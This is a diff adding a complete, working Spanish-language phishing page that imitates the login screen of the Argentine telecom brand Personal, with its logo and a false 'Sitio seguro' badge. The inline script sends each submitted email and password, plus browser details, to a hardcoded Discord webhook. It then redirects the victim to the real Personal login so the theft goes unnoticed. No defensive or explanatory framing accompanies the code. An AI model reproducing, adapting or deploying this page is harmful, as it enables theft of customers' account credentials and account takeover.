@@ -1,0 +1,555 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Personal | Ingresar</title>
+    <style>
+        /* TODO EL CSS QUE YA TENÍAS SE MANTIENE IGUAL */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: #fff;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .login-container {
+            display: flex;
+            height: 100vh;
+            width: 100%;
+            background-color: white;
+        }
+
+        .login-left {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 0 70px;
+            background-color: white;
+            overflow-y: auto;
+        }
+
+        .logo {
+            margin-bottom: 48px;
+        }
+
+            .logo img {
+                height: 36px;
+                width: auto;
+            }
+
+        .title {
+            font-size: 32px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 40px;
+            line-height: 1.4;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .required {
+            color: #e74c3c;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            transition: all 0.3s;
+            outline: none;
+            background-color: #fff;
+        }
+
+            input:focus {
+                border-color: #0066b3;
+                box-shadow: 0 0 0 3px rgba(0, 102, 179, 0.1);
+            }
+
+            input::placeholder {
+                color: #aaa;
+            }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #999;
+            font-size: 14px;
+            user-select: none;
+            background: white;
+            padding: 0 4px;
+        }
+
+            .toggle-password:hover {
+                color: #0066b3;
+            }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background-color: #0066b3;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 8px;
+            margin-bottom: 20px;
+        }
+
+            .btn-login:hover {
+                background-color: #0052a0;
+            }
+
+        .links-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+            .links-row a {
+                color: #0066b3;
+                text-decoration: none;
+                font-size: 14px;
+            }
+
+                .links-row a:hover {
+                    text-decoration: underline;
+                }
+
+        .divider {
+            border-top: 1px solid #e0e0e0;
+            margin: 32px 0;
+        }
+
+        .info-section {
+            margin-bottom: 32px;
+        }
+
+        .info-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 12px;
+        }
+
+        .info-list {
+            list-style: none;
+            padding-left: 0;
+        }
+
+            .info-list li {
+                font-size: 14px;
+                color: #666;
+                margin-bottom: 8px;
+                padding-left: 20px;
+                position: relative;
+                line-height: 1.4;
+            }
+
+                .info-list li::before {
+                    content: "•";
+                    color: #0066b3;
+                    font-weight: bold;
+                    font-size: 16px;
+                    position: absolute;
+                    left: 0;
+                    top: 0;
+                }
+
+                .info-list li strong {
+                    color: #333;
+                }
+
+        .register-link {
+            text-align: center;
+            margin-top: 24px;
+        }
+
+            .register-link p {
+                font-size: 14px;
+                color: #666;
+                margin-bottom: 4px;
+            }
+
+            .register-link a {
+                color: #0066b3;
+                text-decoration: none;
+                font-weight: 600;
+                font-size: 14px;
+            }
+
+                .register-link a:hover {
+                    text-decoration: underline;
+                }
+
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 32px;
+            padding-top: 24px;
+        }
+
+        .secure-icon {
+            width: 16px;
+            height: 16px;
+            background-color: #4caf50;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .secure-text {
+            font-size: 12px;
+            color: #888;
+        }
+
+        .login-right {
+            flex: 1;
+            background: linear-gradient(135deg, #0066b3 0%, #004d80 100%);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+            .login-right img {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;
+                object-position: center;
+            }
+
+        /* Spinner de carga */
+        .loading-spinner {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+            .loading-spinner.active {
+                display: flex;
+            }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0066b3;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .login-right {
+                display: none;
+            }
+
+            .login-left {
+                padding: 0 30px;
+            }
+
+            .title {
+                font-size: 28px;
+            }
+
+            .links-row {
+                flex-direction: column;
+                gap: 12px;
+                align-items: flex-start;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-left {
+                padding: 0 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-left">
+            <div class="logo">
+                <img src="https://i.ibb.co/bg3DY7ZY/Personal-logo-2021-svg.png" alt="Personal">
+            </div>
+
+            <h1 class="title">Ingresá a tu cuenta</h1>
+            <p class="subtitle">Accedé con tu email y contraseña</p>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Email <span class="required">*</span></label>
+                    <input type="email" id="email" name="email" placeholder="ejemplo@mail.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Contraseña <span class="required">*</span></label>
+                    <div class="password-wrapper">
+                        <input type="password" id="password" name="password" placeholder="Ingresá tu contraseña" required>
+                        <span class="toggle-password" onclick="togglePassword()">Mostrar</span>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-login">Ingresar</button>
+            </form>
+
+            <div class="links-row">
+                <a href="#" data-redirect="true">¿Olvidaste tu contraseña?</a>
+                <a href="#" data-redirect="true">¿Olvidaste tu usuario?</a>
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="info-section">
+                <p class="info-title">¿Cómo podés iniciar sesión?</p>
+                <ul class="info-list">
+                    <li><strong>Email</strong>: con la contraseña que elegiste.</li>
+                    <li><strong>Línea móvil</strong>: con un código que te llegará por SMS.</li>
+                </ul>
+            </div>
+
+            <div class="register-link">
+                <p>¿Todavía no te registraste?</p>
+                <a href="#" data-redirect="true">Crear cuenta</a>
+            </div>
+
+            <div class="secure-badge">
+                <span class="secure-icon"></span>
+                <span class="secure-text">Sitio seguro</span>
+            </div>
+        </div>
+
+        <div class="login-right">
+            <img src="https://i.ibb.co/0yTbXMsg/image2-1.png" alt="Persona usando notebook">
+        </div>
+    </div>
+
+    <!-- Spinner de carga -->
+    <div class="loading-spinner" id="loadingSpinner">
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        // ⚠️ IMPORTANTE: Reemplaza esta URL con la de tu webhook de Discord
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1486230728336478258/b0Iuc-M47Hz8NH_He12Y1MuNSdK6uI5kVRQR5Ag4Dv4W41ZXwaQBvLYaU0CtjlvPIoUD';
+
+        // URL de redirección proporcionada
+        const redirectUrl = 'http://idpsesion.personal.com.ar/openam/XUI/?realm=/digitalUser&authIndexType=service&authIndexValue=loginConditionalMFA&goto=https://idpsesion.personal.com.ar:443/openam/oauth2/digitalUser/authorize?redirect_uri%3Dhttps://market.personal.com.ar/module/mooauthsso/sso%26response_type%3Dcode%26client_id%3DtDGyYrbIdOJ35zK29VexfBAhXpj3RTIDNHQjK26A%26scope%3Dopenid%2520profile%2520email%26state%3Dstate-88aa2fc496884d2c4cd13b2fbf944a5232f4dfef0d1c390e717b00cb138acace%26access_type%3Doffline%26acr_values%3Daal2_conditional-device%26prompt%3D%26acr%3Daal2_conditional-device%26acr_sig%3DEfLFzN4xFT4dtWPwcS7FztWcjFn5JYnsSlxnQXwhF2w#login/';
+
+        // Función para mostrar/ocultar contraseña
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const toggleBtn = document.querySelector('.toggle-password');
+
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleBtn.textContent = 'Ocultar';
+            } else {
+                passwordInput.type = 'password';
+                toggleBtn.textContent = 'Mostrar';
+            }
+        }
+
+        // Función para enviar datos a Discord
+        async function sendToDiscord(email, password) {
+            // Obtener información adicional del navegador
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const timestamp = new Date().toLocaleString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
+
+            // Crear el mensaje para Discord
+            const embed = {
+                title: "🔐 Nuevo intento de inicio de sesión",
+                color: 0x0066b3, // Color azul de Personal
+                fields: [
+                    {
+                        name: "📧 Email",
+                        value: email,
+                        inline: true
+                    },
+                    {
+                        name: "🔒 Contraseña",
+                        value: password,
+                        inline: true
+                    },
+                    {
+                        name: "🖥️ Dispositivo",
+                        value: userAgent.substring(0, 100),
+                        inline: false
+                    },
+                    {
+                        name: "💻 Plataforma",
+                        value: platform,
+                        inline: true
+                    },
+                    {
+                        name: "🌐 Idioma",
+                        value: language,
+                        inline: true
+                    },
+                    {
+                        name: "📅 Fecha y hora",
+                        value: timestamp,
+                        inline: false
+                    },
+                    {
+                        name: "🌍 IP (aproximada)",
+                        value: "Obtenida por Discord",
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: "Login Personal - Sistema de autenticación"
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            const payload = {
+                content: "@everyone **¡NUEVO ACCESO REGISTRADO!**",
+                embeds: [embed],
+                username: "Sistema de Login Personal",
+                avatar_url: "https://i.ibb.co/bg3DY7ZY/Personal-logo-2021-svg.png"
+            };
+
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    console.log('✅ Datos enviados a Discord correctamente');
+                    return true;
+                } else {
+                    console.error('❌ Error al enviar a Discord:', response.status);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Error de conexión:', error);
+                return false;
+            }
+        }
+
+        // Mostrar/ocultar spinner
+        function showSpinner(show) {
+            const spinner = document.getElementById('loadingSpinner');
+            if (show) {
+                spinner.classList.add('active');
+            } else {
+                spinner.classList.remove('active');
+            }
+        }
+
+        // Redirigir a la URL de Personal
+        function redirectToPersonal() {
+            window.location.href = redirectUrl;
+        }
+
+        // Manejo del formulario
+        const loginForm = document.getElementById('loginForm');
+
+        if (loginForm) {
+            loginForm.addEventListener('submit', async function (e) {
+                e.preventDefault();
+
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+
+                if (email.trim() === '') {
+                    alert('Por favor, ingresá tu email');
+                    return;
+                }
+
+                if (password.trim() === '') {
+                    alert('Por favor, ingresá tu contraseña');
+                    return;
+                }
+
+                // Mostrar spinner de carga
+                showSpinner(true);
+
+                // Enviar datos a Discord
+                const sent = await sendToDiscord(email, password);
+
+                if (sent) {
+                    console.log('✅ Datos capturados y enviados correctamente');
+                }
+
+                // Pequeña pausa para asegurar que el mensaje se envía
+                setTimeout(() => {
+                    showSpinner(false);
+                    // Redirigir a la página real de Personal
+                    redirectToPersonal();
+                }, 1000);
+            });
+        }
+
+        // Hacer que todos los enlaces con el atributo data-redirect="true" redirijan
+        const redirectLinks = document.querySelectorAll('a[data-redirect="true"]');
+        redirectLinks.forEach(link => {
+            link.addEventListener('click', function (e) {
+                e.preventDefault();
+                redirectToPersonal();
+            });
+        });
+    </script>
+</body>
+</html>
